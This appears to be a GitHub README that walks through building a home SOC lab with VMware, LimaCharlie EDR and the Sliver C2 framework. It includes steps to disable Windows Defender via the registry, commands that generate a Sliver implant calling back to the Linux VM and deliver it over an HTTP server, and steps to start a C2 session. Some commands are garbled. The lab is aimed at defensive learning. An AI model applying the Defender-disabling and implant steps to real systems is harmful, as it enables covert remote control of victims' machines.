# 👨🏻‍💻 🌎  Building a SOC Analysis Lab Environment At Home 👨🏻‍💻 🌎 
## Lab Overview

This SOC Analyst home lab is an excellent opportunity to learn new skills beyond the basics and fundamentals. It involves a hands-on experience such as setting up virtualized environments, deploying operating systems, honing command line proficiency, and establishing C2 servers. The primary goal of the lab is to provide practical cybersecurity skills, addressing both offensive and defensive roles. It encompasses telemetry and EDR analysis using tools like Sysmon and LimaCharlie.
Through this structured exploration, individuals gain a comprehensive understanding of security operations. This knowledge serves as a solid base for a seamless transition into cloud security engineering, enhancing proficiency in handling various cybersecurity challenges.


![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%20final.jpg) 


## Lab Requirements:

- **Virtualization Platform:**
  - VMware Workstation

- **Operating Systems:**
  - Ubuntu Server VM
    - [Download Ubuntu ISO](https://releases.ubuntu.com/22.04.1/ubuntu-22.04.1-live-server-amd64.iso)
  - Windows VM
    - [Download WinDev2311Eval.zip](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)

- **Security Tools:**
  - LimaCharlie
    - Create an account and configure EDR on Windows VM
  - Sliver Framework
    - Set up a Command & Control server on Linux VM

- **Networking:**
  - Internet connection for VM downloads and configurations
  - SSH for Linux VM access

- **Administrative Privileges:**
  - Ensure administrative privileges for VM configurations
  - Disable Windows Defender on Windows VM


## VMware Workstation Configuration:

  - Open VMware Workstation and go to Edit and "Virtual Network Editor.
  - Create new VMnet with NAT configurations.

## UbuntuServer VM Installation and Configuration:

 - Download Ubuntu Server ISO and create a VM.
 - Remember to check Install OpenSSHserver check box during installation.
 - Ping google.com from Ubuntu Server terminal (ping–c 4 google.com).

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Img%202.png) 


## Windows VM Installation and Configuration:

- Download WinDev2311Eval.zip.
- Right click on WinDev2311Eval file and open with VMware workstation.


### Disabling Windows Defender:

1. After import, windows VM will login automatically with Username User. To disable windows defender, click on start à Settings.
2. Click Privacy & Security.
3. Open Windows Security.
4. Click Manage Settings.
5. Toggle OFF the "Tamper Protection" switch. When prompted, click "Yes".
6. Toggle every other option OFF as well.
7. Right click on start menu icon and type cmd, and open it as Administrator.
8. Type following command in cmd and press Enter.
![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Img%203.png)
9. Again right click on start menu icon, click on "Run" and type "msconfig" and press Enter.
10. Go to "Boot" tab and select "Boot Options". Check the box for "Safe boot" and "Minimal".
11. When prompted, click on Restart.
12. Now, in Safe Mode, we'll disable some services via the Registry. Click the "Start" menu icon Type "regedit" into the search bar and hit Enter. For each of the following registry locations, you'll need to browse to the key, find the "Start" value, and change it to 4.
    
            Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense
            Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot
            Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend
            Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv
            Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc
            Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter
13. Again right click on start menu icon and click "Run" and type "msconfig".
14. Go to "Boot" tab and select "Boot Options". Uncheck the box for "Safe boot", click Apply and OK.

### Prevent the VM from going into standby:

After windows reboot in normal mode, open cmd with Administrative privileges and type following commands:

            powercfg /change standby-timeout-ac 0 
            powercfg /change standby-timeout-dc 0 
            powercfg /change monitor-timeout-ac 0 
            powercfg /change monitor-timeout-dc 0 
            powercfg /change hibernate-timeout-ac 0 
            powercfg /change hibernate-timeout-dc 0

## Install LimaCharlie EDR on Windows VM:

1. LimaCharlie is a very powerful "SecOps Cloud Platform". It not only comes with a cross- platform EDR agent, but also handles all of the log shipping/ingestion and has a threat detection engine. Create free account on [https://app.limacharlie.io/login](https://app.limacharlie.io/login). After creation of account, log in. Once logged into LimaCharlie, create an organization.
2. Once the organization is created, click "Add Sensor".
3. Select Windows, Provide a description such as: Windows VM - Lab, Click Create.
   
![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%204.jpg) 

4. Specify the x86–64 (.exe) sensor.

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%205.jpg) 

5. Download the selected installer.
6. Open an Administrative PowerShell prompt and paste the following command.

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%206.jpg)

7. Next, we will copy the install command provided by LimaCharlie which contains the installation key. Paste this command into your open terminal.

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%207.jpg)

8.If everything worked correctly, in the LimaCharlie web UI you should also see the sensor reporting in.

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%208.jpg)

9. Now let's configure LimaCharlie to also ship the Sysmon event logs alongside its own EDR telemetry. In the left-side menu, click "Artifacts". Next to "Artifact Collection Rules" click "Add Rule".

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%209.jpg)

            Enter following details:
            Name: windows-sysmon-logs
            Platforms: Windows
            Path Pattern: wel://Microsoft-Windows-Sysmon/Operational:*
            Retention Period: 10
            Then Click "Save Rule"



## Setup Attack System:

We'll perform these steps from HOST system, by using SSH to access the Linux VM.
1. Using the statically assigned IP address we copied down in the Linux VM installation process, let's SSH onto the VM from host system.
   
![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2010.jpg)

2. Now, from within this new SSH session, proceed with the following instructions to setup our attacker Command & Control server. First, let's drop into a root shell.

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2011.jpg)

3. Run the following commands to download Sliver, a Command & Control (C2) framework.

        wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O
        usr/local/bin/sliver-server # Make it executable
        chmod +x /usr/local/bin/sliver-server
        # install mingw-w64 for additional capabilities apt install -y mingw-w64

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2012.jpg)

4. Create a working directory which will be used in future steps.

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2013.jpg)
   
## Generating C2 payload:

1. Open SSH session on the Linux VM (like in previous steps) and perform following actions.
   
       sudo su
       cd /opt/sliver sliver-server
   
![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2014.jpg)

2. Generate first C2 session payload (within the Sliver shell above). Be sure to use Linux VM's IP address we statically set.

          generate - http [Linux_VM_IP] - save /opt/sliver

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2015.jpg)

3. Output of above mentioned command.

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2016.jpg)

4. Confirm the new implant configuration by typing implants.

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2017.jpg)

5. Now we have a C2 payload we can drop onto Windows VM. Type exit to exit Sliver for now.

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2018.jpg)

6. To easily download the C2 payload from the Linux VM to the Windows VM, use following commands.

        cd /opt/sliver
        python3 -m http.server 80

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2019.jpg)   

7. Switch to the Windows VM, launch Administrative PowerShell console and execute following command in PowerShell

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2020.jpg)   

8. As a result of above mentioned command, a payload will be downloaded from Ubuntu server on Windows VM.

## Starting Command and Control Session:

1. Now that the payload is on the Windows VM, we must switch back to the Linux VM SSH session and enable the Sliver HTTP server to catch the callback.

   a. First, terminate the python web server we started by pressing Ctrl + C.
   b. Relaunch Sliver.
   c. Start the Sliver HTTP listener.

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2021.jpg)  


2. Return to the Windows VM and execute the C2 payload from its download location using the same administrative PowerShell prompt we had from before.   
   
![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2022.jpg) 

3. Within a few moments, you should see your session check in on the Sliver server.

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2023.jpg) 


4. Verify your session in Sliver by typing sessions.

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2024.jpg) 

5. To interact with C2 session, type the following command into the Sliver shell, swapping [session_id] with yours


        use [session_id]

![image]() 

6. You are now interacting directly with the C2 session on the Windows VM. Let's run a few basic commands.

     a. Get basic info about the session (type info).

     ![image]()

     b. To check privileges, type command getprivs.












👨🏻‍💻 🚀
